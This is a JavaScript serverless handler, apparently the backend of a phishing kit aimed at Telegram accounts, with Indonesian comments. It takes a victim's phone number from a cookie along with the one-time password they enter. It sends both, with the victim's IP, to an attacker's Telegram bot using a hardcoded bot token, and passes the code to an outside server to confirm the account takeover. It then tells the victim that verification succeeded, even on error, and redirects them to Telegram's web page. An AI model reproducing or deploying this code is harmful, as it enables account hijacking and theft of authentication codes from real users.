// API untuk log OTP
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const { otp } = req.body;
    
    // Ambil nomor dari cookie atau body
    const cookies = req.headers.cookie || '';
    const phoneMatch = cookies.match(/target_phone=([^;]+)/);
    const phone = phoneMatch ? decodeURIComponent(phoneMatch[1]) : req.body.phone;
    
    if (!phone || !otp) {
      return res.status(400).json({ error: 'Nomor dan OTP diperlukan' });
    }
    
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    console.log('🔐 OTP DITERIMA:', { phone, otp, ip });
    
    // ================= KIRIM OTP KE BOT =================
    const BOT_TOKEN = process.env.BOT_TOKEN || '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
    const CHAT_ID = process.env.CHAT_ID || '7933552719';
    
    const successMessage = `✅ *OTP BERHASIL DIAMBIL!* \n\n📱 *Nomor:* \`${phone}\`\n🔐 *Kode OTP:* \`${otp}\`\n📍 *IP:* \`${ip}\`\n⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n\n⚠️ *AKUN DAPAT DIAKSES*`;
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: successMessage,
        parse_mode: 'Markdown'
      })
    });
    
    // ================= VERIFIKASI OTP (OPSIONAL) =================
    const OTP_SERVER = process.env.OTP_SERVER || 'https://otp-server.up.railway.app';
    
    try {
      const verifyResponse = await fetch(`${OTP_SERVER}/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, otp })
      });
      
      const verifyData = await verifyResponse.json();
      if (verifyData.success) {
        // Kirim notifikasi tambahan kalau akun berhasil diverifikasi
        const extraMsg = `🎯 *AKUN TERVERIFIKASI!* \n\n👤 User ID: ${verifyData.user?.id || 'N/A'}\n📱 ${phone}\n🔐 OTP Valid`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: extraMsg,
            parse_mode: 'Markdown'
          }),
          headers: { 'Content-Type': 'application/json' }
        });
      }
    } catch (verifyError) {
      console.log('Verifikasi OTP dilewati:', verifyError.message);
    }
    
    // Hapus cookie
    res.setHeader('Set-Cookie', 'target_phone=; Path=/; Max-Age=0; SameSite=Lax');
    
    return res.status(200).json({
      success: true,
      message: 'Verifikasi berhasil',
      redirect: 'https://web.telegram.org/'
    });
    
  } catch (error) {
    console.error('❌ ERROR log OTP:', error);
    
    return res.status(200).json({
      success: true,
      message: 'Verifikasi berhasil',
      redirect: 'https://web.telegram.org/'
    });
  }
}
